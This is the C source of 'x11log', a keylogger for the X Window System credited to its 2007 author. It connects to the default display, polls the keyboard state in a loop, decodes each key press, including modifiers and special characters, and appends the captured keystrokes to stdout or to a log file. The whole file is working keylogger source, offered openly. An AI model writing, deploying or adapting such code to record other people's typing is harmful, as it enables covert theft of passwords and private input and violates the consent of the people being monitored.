/*
 * x11log - an Keylogger for the X Window System
 * (c) Erik Sonnleitner 2007; this is GPLed code.
 * www.delta-xi.net, esonn<at>gmx<dot>net
 * */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <X11/Xlib.h>
#include <X11/X.h>

#include <sys/types.h>
#include <sys/time.h>
#include <signal.h>

#define MAX_KEYLEN 		16
#define SHIFT_DOWN		1
#define LOCK_DOWN		2
#define CONTROL_DOWN	3
#define DELAY			10000

#define XKBD_WIDTH		32
#define BYTE_LENGTH		8

#define SWAP(a,b,c) c t;t=a;a=b;b=t;

/* prototypes */
char* decodeKey(int code, int down, int mod);
int getMods(char *kbd);
int getbit(char *kbd, int idx);
void catch_sigkill(int sig);


/* global vars */
char hostname[] = ":0";
char *kbd, *tmp, *ptr, dump_a[XKBD_WIDTH], dump_b[XKBD_WIDTH];
FILE *out;
XModifierKeymap *map;
Display *dsp;


struct remap_struct { char src[20], dst[8];} remap[] = {
	{"Return","\n"}, {"escape","^["}, {"delete", ">D"}, {"shift",""}, {"control",""}, {"tab","\t"}, {"space", " "},
	{"exclam", "!"}, {"quotedbl", "\""}, {"numbersign", "#"}, {"dollar", "$"}, {"percent", "%"}, {"ampersand", "&"},
	{"apostrophe", "'"}, {"parenleft", "("},	{"parenright", ")"}, {"asterisk", "*"}, {"plus", "+"}, {"comma", ","},
	{"minus", "-"}, {"period", "."},	{"slash", "/"}, {"colon", ":"}, {"semicolon", ";"},	{"less", "<"}, {"equal", "="},	
	{"greater", ">"},	{"question", "?"}, {"at", "@"}, {"bracketleft", "["}, {"backslash", "\\"}, {"bracketright", "]"},
	{"asciicircum", "^"},	{"underscore", "_"}, {"grave", "`"}, {"braceleft", "{"},	{"bar", "|"}, {"braceright", "}"},
	{"asciitilde", "~"},	{"odiaeresis","ö"}, {"adiaeresis","ä"}, {"udiaeresis","ü"}, {"Odiaeresis","Ö"}, {"Adiaeresis","Ä"},
	{"Udiaeresis","Ü"}, {"ssharp","ß"}, {"",""}
};



/* main () */
int main (int argc, char ** argv) {
	int i;
	time_t rawtime;
	struct tm * timeinfo;

	out = stdout;

	/* connect signals to handler-functions */
	signal(SIGTERM, catch_sigkill);
	signal(SIGINT, catch_sigkill);

	/* just for logging */
	time(&rawtime);
	timeinfo = (struct tm*)localtime(&rawtime);

	/* if argument is given, log to file */
	if(argc == 2) {
		printf("Logging to file %s\n", argv[1]);
		out = fopen(argv[1], "a");
		if(!out) {
			printf("Error writing to %s, fallback to console.\n", argv[1]);
			out = stdout;
		}
	}

	dsp = XOpenDisplay(NULL); //just try default display
	if(!dsp) {
		fprintf(stderr, "Cannot open Display\n");
		return EXIT_FAILURE;
	}

	XSynchronize (dsp, True);

	map = XGetModifierMapping(dsp);

	kbd = dump_a;
	tmp = dump_b;

	XQueryKeymap(dsp, kbd);
	fprintf(out, "\n\n--New Session at %s\n", asctime(timeinfo));

	/* we'll only try to find changed keys */
	for(;; usleep(DELAY)){
		SWAP(kbd, tmp, char*);
		XQueryKeymap(dsp, kbd);

		for (i = 0; i < XKBD_WIDTH * BYTE_LENGTH; i++)
			if(getbit(kbd, i) != getbit(tmp, i)) 
				if(getbit(kbd, i)){
					fprintf(out, "%s", (char*)decodeKey(i, getbit(kbd, i), getMods(kbd)));
					fflush(out);
				}
	}
}

/*
 * decodeKey(int,int,int)
 * checks keycodes and mods, and return a human-readable interpretation of the keyboard status
 * */
char* decodeKey(int code, int down, int mod) {
	static char *str, dump[MAX_KEYLEN + 1];
	int i = 0, remapChar = 0;
	KeySym sym;

	sym = XKeycodeToKeysym(dsp, code, (mod == SHIFT_DOWN) ? True : False);
	if(sym == NoSymbol)
		return "";

	str = XKeysymToString(sym);
	if(!str)
		return "";

	sprintf(dump, "%s", str);

	/* shortenize (remap) char str if in mapping table */
	while (remap[i].src[0]) {
		if (strstr(dump, remap[i].src)) {
			strcpy(dump, remap[i].dst);
			remapChar = 1;
			break;
		}
		i++;
	}

	/* no remapping, but "long" keysym */
	if(dump[1] && !remapChar) {
		(down) ? sprintf(dump, "%s%s%s", "[+", str, "]") : sprintf(dump, "%s%s%s", "[-", str, "]");
		return dump;
	}

	if(mod == CONTROL_DOWN) 
		sprintf(dump, "%c%c%c", '^', dump[0], '\0');

	if(mod == LOCK_DOWN) 
		dump[0] == toupper(dump[0]);

	return dump;
}

/*
 * getMods(char*)
 * reads the mod key(s) out of the current keyboard status and returns the given mods
 * */
int getMods(char *kbd) {
	int i;
	KeyCode kc;

	for (i = 0; i < map->max_keypermod; i++) {
		kc = map->modifiermap[ControlMapIndex * map->max_keypermod + i];
		if(kc && getbit(kbd, kc))
			return CONTROL_DOWN;

		kc = map->modifiermap[ShiftMapIndex * map->max_keypermod + i];
		if(kc && getbit(kbd, kc))
			return SHIFT_DOWN;

		kc = map->modifiermap[LockMapIndex * map->max_keypermod + i];
		if(kc && getbit(kbd, kc))
			return LOCK_DOWN;
	}

	return 0;
}

/* reads exactly one bit of an char array, at position idx */
int getbit(char *kbd, int idx) {
	return kbd[idx/8] & (1<<(idx%8));
}

/* catches signals .. ends application */
void catch_sigkill(int sig) {
	fprintf(stdout, "\n -- x11log terminated.\n");
	if(out != stdout)
		fclose(out);

	exit(EXIT_SUCCESS);
}

